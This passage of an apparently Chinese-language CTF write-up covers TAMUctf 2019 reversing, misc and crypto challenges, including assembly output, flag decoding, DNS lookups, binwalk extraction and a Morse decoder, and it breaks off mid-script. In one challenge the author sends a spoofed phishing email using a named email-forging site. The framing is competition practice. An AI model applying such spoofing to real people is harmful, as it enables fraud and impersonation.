class="line">&gt; movl-36(%rbp), %eax</span><br><span class="line">&gt; imull-36(%rbp), %eax</span><br><span class="line">&gt; imull-36(%rbp), %eax</span><br><span class="line">&gt; movl-28(%rbp), %esi</span><br><span class="line">&gt; addl-32(%rbp), %esi</span><br><span class="line">&gt; addl-32(%rbp), %esi</span><br><span class="line">&gt; imull%esi, %eax</span><br><span class="line">&gt; cltd</span><br><span class="line">&gt; movl-64(%rbp), %esi         ## 4-byte Reload</span><br><span class="line">&gt; idivl%esi</span><br><span class="line">&gt; movl%eax, -44(%rbp)</span><br><span class="line">&gt; movl-40(%rbp), %esi</span><br><span class="line">&gt; movq-56(%rbp), %rdi         ## 8-byte Reload</span><br><span class="line">&gt; movb$0, %al</span><br><span class="line">&gt; callq_printf</span><br><span class="line">&gt; leaqL_.str.1(%rip), %rdi</span><br><span class="line">&gt; movl-44(%rbp), %esi</span><br><span class="line">&gt; movl%eax, -68(%rbp)         ## 4-byte Spill</span><br><span class="line">&gt; movb$0, %al</span><br><span class="line">&gt; callq_printf</span><br><span class="line">&gt; leaqL_.str.2(%rip), %rdi</span><br><span class="line">&gt; leaq-16(%rbp), %rsi</span><br><span class="line">&gt; movl%eax, -72(%rbp)         ## 4-byte Spill</span><br><span class="line">&gt; movb$0, %al</span><br><span class="line">&gt; callq_printf</span><br><span class="line">&gt; movq___stack_chk_guard@GOTPCREL(%rip), %rsi</span><br><span class="line">&gt; movq(%rsi), %rsi</span><br><span class="line">&gt; movq-8(%rbp), %rdi</span><br><span class="line">&gt; cmpq%rdi, %rsi</span><br><span class="line">&gt; movl%eax, -76(%rbp)         ## 4-byte Spill</span><br><span class="line">&gt; jneLBB1_2</span><br><span class="line">&gt; ## %bb.1:</span><br><span class="line">&gt; xorl%eax, %eax</span><br><span class="line">&gt; addq$80, %rsp</span><br><span class="line">&gt; popq%rbp</span><br><span class="line">&gt; retq</span><br><span class="line">&gt; LBB1_2:</span><br><span class="line">&gt; callq___stack_chk_fail</span><br><span class="line">&gt; ud2</span><br><span class="line">&gt; .cfi_endproc</span><br><span class="line">&gt;                                         ## -- End function</span><br><span class="line">&gt; .section__TEXT,__cstring,cstring_literals</span><br><span class="line">&gt; L_.str:                                 ## @.str</span><br><span class="line">&gt; .asciz&quot;The answer: %d\n&quot;</span><br><span class="line">&gt; </span><br><span class="line">&gt; L_.str.1:                               ## @.str.1</span><br><span class="line">&gt; .asciz&quot;Maybe it&apos;s this:%d\n&quot;</span><br><span class="line">&gt; </span><br><span class="line">&gt; L_.str.2:                               ## @.str.2</span><br><span class="line">&gt; .asciz&quot;gigem&#123;%s&#125;\n&quot;</span><br><span class="line">&gt; </span><br><span class="line">&gt; </span><br><span class="line">&gt; .subsections_via_symbols</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>注意到71-78行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">"gigem&#123;%s&#125;"</span>%<span class="string">""</span>.join(chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">65</span>,<span class="number">53</span>,<span class="number">53</span>,<span class="number">51</span>,<span class="number">77</span>,<span class="number">98</span>,<span class="number">49</span>,<span class="number">89</span>])</span><br><span class="line"><span class="comment"># gigem&#123;A553Mb1Y&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Who-am-I"><a href="#Who-am-I" class="headerlink" title="Who am I?"></a>Who am I?</h2><blockquote><p>What is the A record for <code>tamuctf.com</code>?<br>(Not in standard <code>gigem{flag}</code> format)</p></blockquote><p><code>tamuctf.com</code> 的域名A记录为<code>52.33.57.247</code> ，提交即可。可使用<a href="https://centralops.net/co/NsLookup.aspx" target="_blank" rel="noopener">这个网站</a> 或者命令<code>nslookup -type=all tamuctf.com</code> 。</p><h2 id="Who-do-I-trust"><a href="#Who-do-I-trust" class="headerlink" title="Who do I trust?"></a>Who do I trust?</h2><blockquote><p>Who issued the certificate to <code>tamuctf.com</code>?<br>(Not in standard <code>gigem{flag}</code> format)</p></blockquote><p>查看证书知颁发机构为 <code>Let&#39;s Encrypt Authority X3</code> 。</p><h2 id="Where-am-I"><a href="#Where-am-I" class="headerlink" title="Where am I?"></a>Where am I?</h2><blockquote><p>What is the name of the city where the server for tamuctf.com is located?</p><p>(Not in standard gigem{flag} format)</p></blockquote><p>使用<a href="https://check-host.net/ip-info?host=tamuctf.com" target="_blank" rel="noopener">在线网站</a> 查询得到服务器所在城市为 <code>Boardman</code> 。</p><h2 id="I-heard-you-like-files"><a href="#I-heard-you-like-files" class="headerlink" title="I heard you like files."></a>I heard you like files.</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$binwalk</span> -e art.png</span><br><span class="line"><span class="variable">$tail</span> -n1  _art.png.extracted/word/media/image1.png | base64 -d</span><br><span class="line">flag&#123;P0lYt@r_D0_y0u_G3t_It_N0w?&#125;</span><br></pre></td></tr></table></figure><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><p>在页面全选可发现端倪。</p><p><img src="1552784857947.png" alt="1552784857947"></p><p>这是一种由空白字符（空白符、制表符、换行符）组成的<a href="https://en.wikipedia.org/wiki/Whitespace_(programming_language" target="_blank" rel="noopener">编程语言</a>)。这是一个 <a href="https://naokikp.github.io/wsi/whitespace.html" target="_blank" rel="noopener">在线解释器</a> 。</p><p><img src="1552784704688.png" alt="1552784704688"></p><p>flag is <code>gigem{0h_my_wh4t_sp4c1ng_y0u_h4v3}</code> 。</p><h2 id="Onboarding-Checklist"><a href="#Onboarding-Checklist" class="headerlink" title="Onboarding Checklist"></a>Onboarding Checklist</h2><blockquote><p>From: <a href="mailto:importantperson@somebigcorp.com" target="_blank" rel="noopener">importantperson@somebigcorp.com</a><br>Date: Feb 22, 2019 9:00 AM<br>To: <a href="mailto:someguy@somebigcorp.com" target="_blank" rel="noopener">someguy@somebigcorp.com</a><br>Subject: New Employee Access</p><p>Hello Some Guy,</p><p>We need to begin sending requests for the new employee to get access to our security appliances. I believe they already know that you are authorized to make a new account request. Would you mind sending the new employee’s email address to <a href="mailto:tamuctf@gmail.com" target="_blank" rel="noopener">tamuctf@gmail.com</a> so they can process the account request?</p><p>Thank you,<br>Important Person</p><p>The new employee can be a little slow to respond.</p><p>Difficulty: easy</p><p>2/26 8:42 am CST: Visting <code>somebigcorp.com</code> is not part of the challenge</p></blockquote><p>按照指示发送钓鱼邮件，接收到flag为<code>gigem{wuT_4n_31337_sp0ofer_494C4F5645594F55}</code>。</p><p>工具：<a href="https://emkei.cz/" target="_blank" rel="noopener">伪造邮件</a>，<a href="https://www.guerrillamail.com/" target="_blank" rel="noopener">临时邮箱</a> 。</p><p><img src="1552787841366.png" alt="1552787841366"></p><p><img src="1552787882188.png" alt="1552787882188"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id=""><a href="#" class="headerlink" title="-.-"></a>-.-</h2><blockquote><p>To 1337-H4X0R:</p><p>Our coworker Bob loves a good classical cipher. Unfortunately, he also loves to send everything encrypted with these ciphers. Can you go ahead and decrypt this for me?</p><p>Difficulty: easy</p><p>flag.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; dah-dah-dah-dah-dah dah-di-di-dah di-di-di-di-dit dah-dah-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-dah-dah-dah di-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dit dah-dah-dah-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-di-di-dah dah-dah-di-di-dit di-di-di-di-dit di-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-di-dit dah-di-di-di-dit di-di-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-dah-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dit dah-di-di-di-dit dah-di-dit di-di-di-di-dah dah-di-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dit di-di-di-di-dit di-di-dah-dah-dah di-dah dah-dah-di-di-dit di-di-di-dah-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit di-di-di-di-dah dah-dah-dah-di-dit dah-di-di-di-dit dah-di-di-dit dah-di-di-di-dit di-dah di-di-di-di-dah dah-dah-dah-dah-dit dah-dah-di-di-dit di-di-di-di-dah di-di-dah-dah-dah di-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-dah-dah-dah dah-di-di-di-dit di-di-di-di-dah di-dah dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dit di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-di-di-di-dit di-dah dah-di-di-di-dit dah-di-dit di-di-dah-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-dit di-di-di-di-dah di-di-di-di-dah dah-di-di-di-dit dah-di-di-dit dah-di-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dit dit di-di-di-di-dah dit di-di-di-dah-dah dah-dah-dah-dah-dit dah-di-di-di-dit dah-di-di-di-dit dah-di-di-di-dit dah-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-di-dit di-di-di-di-dah di-di-di-di-dit di-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit di-di-dah-dit di-di-di-di-dit di-di-di-di-dah di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dit di-dah di-di-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dah-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit di-dah di-di-di-di-dah dah-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah di-dah di-di-dah-dah-dah di-dah-dah-dah-dah di-di-di-di-dah dah-di-di-di-dit dah-di-di-di-dit dah-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-di-di-di-dit dah-di-dah-dit di-di-dah-dah-dah di-di-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah dah-di-di-di-dit di-dah dah-dah-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dah dah-di-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-di-dah dah-dah-dah-dah-dit di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-di-dit dah-di-di-di-dit di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit dah-dah-di-di-dit di-dah di-di-di-di-dah dah-dah-di-di-dit di-di-dah-dah-dah dah-dah-dah-dah-dah dah-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-di-di-dit dah-di-di-di-dit dah-di-dit dah-dah-di-di-dit dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-dah-dah di-dah-dah-dah-dah dah-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-dit di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit di-di-di-dah-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-dah-dah di-dah-dah-dah-dah di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dah dah-di-di-dit di-di-dah-dah-dah dah-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dit di-di-di-dah-dah dah-dah-dah-dah-dah dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-dah-dah-di-dit di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-dah-dah di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dah dah-dah-dah-dah-dit di-di-di-dah-dah di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-dit di-di-dah-dah-dah dah-dah-dah-dah-dah dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit di-dah di-di-di-di-dah dah-di-di-dit di-di-di-di-dit di-dah dah-dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-di-dit dah-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dah di-di-di-di-dah di-di-di-di-dit di-di-di-dah-dah dah-di-di-di-dit dah-dah-dah-di-dit di-di-di-di-dah dah-di-dah-dit dah-di-di-di-dit dah-di-dit di-di-di-dah-dah dah-dah-dah-di-dit di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit dah-di-di-di-dit dit di-di-di-di-dit di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah dah-dah-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-dah di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dah dit dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah di-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-di-dit dah-dah-dah-di-dit di-di-dah-dah-dah dah-di-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dit di-di-dah-dah-dah di-dah-dah-dah-dah di-di-di-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dit di-di-di-di-dah dah-dah-di-di-dit di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dit di-di-dah-dah-dah dah-dah-di-di-dit di-dah di-di-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah di-dah-dah-dah-dah dah-di-di-di-dit di-dah di-di-dah-dah-dah di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-di-dit di-di-di-di-dah di-di-dah-dah-dah dah-di-di-di-dit di-dah dah-di-di-di-dit di-di-di-di-dah di-di-di-di-dah dit di-di-di-di-dah dah-dah-dah-dah-dit dah-dah-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-dah-dah di-di-di-di-dit dah-dah-di-di-dit dah-dah-di-di-dit di-di-dah-dah-dah di-di-di-dah-dah di-di-dah-dah-dah di-di-di-di-dah di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dit di-di-di-di-dit di-dah di-di-di-di-dah di-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dit di-dah di-di-di-dah-dah di-di-dah-dah-dah dah-dah-di-di-dit di-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-dah-dah-dah dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-di-dit di-di-di-di-dah dah-di-dah-dit di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-dah-dit di-di-di-dah-dah dah-dah-di-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-dah-dah di-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah dah-dah-dah-dah-dit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>solve.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">morse</span><span class="params">(s)</span>:</span></span><br><span class="line">    morseChart = [<span class="string">'.-'</span>,       <span class="string">'-...'</span>,     <span class="string">'-.-.'</span>,     <span class="string">'-..'</span>,      <span class="string">'.'</span>,        <span class="string">'..-.'</span>,     <span class="string">'--.'</span>,</span><br><span class="line">                  <span class="string">'....'</span>,     <span class="string">'..'</span>,       <span class="string">'.---'</span>,     <span class="string">'-.-'</span>,      <span class="string">'.-..'</span>,     <span class="string">'--'</span>,       <span class="string">'-.'</span>,</span><br><span class="line">                  <span class="string">'---'</span>,      <span class="string">'.--.'</span>,     <span class="string">'--.-'</span>,     <span class="string">'.-.'</span>,      <span class="string">'...'</span>,      <span class="string">'-'</span>,        <span class="string">'..-'</span>,</span><br><span class="line">                  <span class="string">'...-'</span>,     <span class="string">'.--'</span>,      <span class="string">'-..-'</span>,     <span class="string">'-.--'</span>,     <span class="string">'--..'</span>,     <span class="string">'-----'</span>,    <span class="string">'.----'</span>,</span><br><span class="line">                  <span class="string">'..---'</span>,    <span class="string">'...--'</span>,    <span class="string">'....-'</span>,    <span class="string">'.....'</span>,    <span class="string">'-....'</span>,    <span class="string">'--...'</span>,    <span class="string">'---..'</span>,</span><br><span class="line">                  <span class="string">'----.'</span>,    <span class="string">'.-.-.-'</span>,   <span class="string">'--..--'</span>,   <span class="string">'..--..'</span>,   <span class="string">'-....-'</span>,   <span class="string">'.----.'</span>,   <span class="string">'---...'</span>,</span><br><span class="line">                  <span class="string">'.-..-.'</span>,   <span class="string">'-..-.'</span>,    <span class="string">'.--.-.'</span>,   <span class="string">'-.-.-.'</span>,   <span class="string">'-...-'</span>,    <span class="string">'-.-.--'</span>,   <span class="string">'..--.-'</span>,</span><br><span class="line">                  <span class="string">'-.--.'</span>,    <span class="string">'-.--.-'</span>,   <span class="string">'...-..-'</span>,  <span class="string">'.-...'</span>,    <span class="string">'.-.-.'</span>,    <span class="string">' '</span>,        <span class="string">'*'</span></span><br><span class="line">                  ]</span><br><span class="line">    alphaChart = [<span class="string">'a'</span>,        <span class="string">'b'</span>,        <span class="string">'c'</span>,        <span class="string">'d'</span>,        <span class="string">'e'</span>,        <span class="string">'f'</span>,        <span class="string">'g'</span>,</span><br><span class="line">                  <span class="string">'h'</span>,        <span class="string">'i'</span>,        <span class="string">'j'</span>,        <span class="string">'k'</span>,        <span class="string">'l'</span>,        <span class="string">'m'</span>,        <span class="string">'n'</span>,</span><br><span class="line">                  <span class="string">'o'</span>,        <span class="string">'p'</span>,        <span class="string">'q'</span>,        <span class="string">'r'</span>,        <span class="string">'s'</span>,        <span class="string">'t'</span>,        <span class="string">'u'</span>,</span><br><span class="line">                  <span class="string">'v'</span>,        <span class="string">'w'</span>,        <span class="string">'x'</span>,        <span class="string">'y'</span>,        <span class="string">'z'</span>,        <span class="string">'0'</span>,        <span class="string">'1'</span>,</span><br><span class="line">                  <span class="string">'2'</span>,        <span class="string">'3'</span>,        <span class="string">'4'</span>,        <span class="string">'5'</span>,        <span class="string">'6'</span>,        <span class="string">'7'</span>,        <span class="string">'8'</span>,</span><br><span class="line">                  <span class="string">'9'</span>,        <span class="string">'.'</span>,        <span class="string">','</span>,        <span class="string">'?'</span>,        <span class="string">'-'</span>,        <span class="string">"'"</span>,        <span class="string">':'</span>,</span><br><span class="line">                  <span class="string">'"'</span>,        <span class="string">'/'</span>,        <span class="string">'@'</span>,        <span class="string">';'</span>,        <span class="string">'='</span>,        <span class="string">'!'</span>,        <span class="string">'_'</span>,</span><br><span class="line">                  <span class="string">'('</span>,        <span class="string">')'</span>,        <span class="string">'$'</span>,        <span class="string">'&amp;'</span>,        <span class="string">'+'</span>,        <span class="string">' '</span>,        <span class="string">'#'</span></span><br><span class="line">                  ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># or as a dict -&gt;  &#123;c[1][i]: c[0][i] for i in xrange(len(c[0]))&#125;</span></span><br><span class="line">    c = [morseChart, alphaChart]</span><br><span class="line"></span><br><span class="line">    s = s.lower()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># replace characters not in alphaChart with '#' ,which shall be '*' in</span></span><br><span class="line">    <span class="comment"># encoded string</span></span><br><span class="line">    s = re.sub(<span class="string">'[^a-z0-9.,?\-\':"/@;=!_()$&amp;+ ]'</span>, <span class="string">'#'</span>, s)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># for convenience sake, I choose not to deal with space in morse.</span></span><br><span class="line">    s = re.sub(<span class="string">'\s+'</span>, <span class="string">' '</span>, s)</span><br><span class="line"></span><br><span class="line">    m = <span class="number">1</span>  <span class="comment"># default to decode</span></span><br><span class="line">    <span class="comment"># if mot mismatch that condition,we are to encode.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.match(<span class="string">'[^-._ ]'</span>, s):</span><br><span class="line">        <span class="comment"># occasionally we meet [ ._]+ instead of [ .-]+</span></span><br><span class="line">        s = s.replace(<span class="string">'_'</span>, <span class="string">'-'</span>)</span><br><span class="line">        s = re.split(<span class="string">' '</span>, s)</span><br><span class="line">        m = <span class="number">0</span>  <span class="comment"># we are  to encode by morse</span></span><br><span class="line"></span><br><span class="line">    r = []</span><br><span class="line">    <span class="comment"># list().extend(foo) returns None so we use 'or r'</span></span><br><span class="line">    <span class="keyword">return</span> (m * <span class="string">' '</span>).join(r.extend([c[<span class="number">1</span> - m][c[m].index(i)] <span class="keyword">for</span> i <span class="keyword">in</span> s]) <span class="keyword">or</span> r)</span><br><span class="line"></span><br><span class="line">cipher=<span class="string">"dah-dah-dah-dah-dah dah-di-di-dah di-di-di-di-dit dah-dah-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-dah-dah-dah di-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dit dah-dah-dah-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-di-di-dah dah-dah-di-di-dit di-di-di-di-dit di-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-di-dit dah-di-di-di-dit di-di-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-dah-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dit dah-di-di-di-dit dah-di-dit di-di-di-di-dah dah-di-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dit di-di-di-di-dit di-di-dah-dah-dah di-dah dah-dah-di-di-dit di-di-di-dah-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit di-di-di-di-dah dah-dah-dah-di-dit dah-di-di-di-dit dah-di-di-dit dah-di-di-di-dit di-dah di-di-di-di-dah dah-dah-dah-dah-dit dah-dah-di-di-dit di-di-di-di-dah di-di-dah-dah-dah di-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-dah-dah-dah dah-di-di-di-dit di-di-di-di-dah di-dah dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dit di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-di-di-di-dit di-dah dah-di-di-di-dit dah-di-dit di-di-dah-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-dit di-di-di-di-dah di-di-di-di-dah dah-di-di-di-dit dah-di-di-dit dah-di-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dit dit di-di-di-di-dah dit di-di-di-dah-dah dah-dah-dah-dah-dit dah-di-di-di-dit dah-di-di-di-dit dah-di-di-di-dit dah-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-di-dit di-di-di-di-dah di-di-di-di-dit di-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit di-di-dah-dit di-di-di-di-dit di-di-di-di-dah di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dit di-dah di-di-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dah-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit di-dah di-di-di-di-dah dah-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah di-dah di-di-dah-dah-dah di-dah-dah-dah-dah di-di-di-di-dah dah-di-di-di-dit dah-di-di-di-dit dah-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-di-di-di-dit dah-di-dah-dit di-di-dah-dah-dah di-di-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah dah-di-di-di-dit di-dah dah-dah-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dah dah-di-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-di-dah dah-dah-dah-dah-dit di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-di-dit dah-di-di-di-dit di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit dah-dah-di-di-dit di-dah di-di-di-di-dah dah-dah-di-di-dit di-di-dah-dah-dah dah-dah-dah-dah-dah dah-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-di-di-dit dah-di-di-di-dit dah-di-dit dah-dah-di-di-dit dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-dah-dah di-dah-dah-dah-dah dah-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-dit di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit di-di-di-dah-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-dah-dah di-dah-dah-dah-dah di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dah dah-di-di-dit di-di-dah-dah-dah dah-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dit di-di-di-dah-dah dah-dah-dah-dah-dah dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-dah-dah-di-dit di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-dah-dah di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dah 